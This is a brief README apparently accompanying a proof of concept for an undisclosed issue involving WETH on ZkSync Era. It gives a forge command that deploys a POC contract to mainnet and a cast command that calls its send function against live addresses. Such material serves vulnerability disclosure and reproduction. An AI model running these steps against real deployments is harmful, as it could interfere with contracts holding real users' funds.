## ZkSync WETH Poc

Steps to reproduce:

1. (Optional) Deploy the contract to ZkSync Era:
   `forge create src/POC.sol:POC --rpc-url https://mainnet.era.zksync.io -i --broadcast --constructor-args 0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91`

2. Call the contract:

`cast call 0x005C3E358a4029AbA21552c3CeE53E391673753E "send(uint256,address)" 1 0xF7C012789aac54B5E33EA5b88064ca1F1172De05 --value 1 --rpc-url https://mainnet.era.zksync.io --trace`

If you deployed the contract, then replace `0x005C3E358a4029AbA21552c3CeE53E391673753E` with your address
